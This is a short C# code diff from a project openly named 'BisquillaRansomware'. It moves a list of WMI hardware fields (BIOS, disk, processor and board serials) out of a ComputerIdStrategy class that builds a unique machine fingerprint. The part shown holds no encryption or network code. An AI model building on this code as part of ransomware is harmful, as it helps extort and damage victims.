@@ -20,25 +20,6 @@ namespace BisquillaRansomware
     /// </summary>
     public class ComputerIdStrategy
     {
-        private const string HARDWARE_INFO = 
-            
-            // BIOS
-            "Win32_BIOS;Manufacturer@Win32_BIOS;SMBIOSBIOSVersion@Win32_BIOS;IdentificationCode@Win32_BIOS;SerialNumber@Win32_BIOS;ReleaseDate@Win32_BIOS;Version"
-            
-            + "@" +
-
-            // HDD
-            "Win32_DiskDrive;Model@Win32_DiskDrive;Manufacturer@Win32_DiskDrive;Signature@Win32_DiskDrive;TotalHeads"
-            + "@" +
-
-            // Processor
-            "Win32_Processor;ProcessorId@Win32_Processor;Manufacturer"
-
-            + "@" +
-
-            // BOARD
-            "Win32_BaseBoard;Model@Win32_BaseBoard;Manufacturer@Win32_BaseBoard;Name@Win32_BaseBoard;SerialNumber";
-        
         /// <summary>
         /// Generates a Unique FingerPrint
         /// </summary>
@@ -57,7 +38,7 @@ namespace BisquillaRansomware
 
             StringBuilder sb = new StringBuilder();
 
-            string[] spec = HARDWARE_INFO.Split('@');
+            string[] spec = ConfigurationManager.HARDWARE_INFO.Split('@');
 
             foreach (string mainSpec in spec)
             {
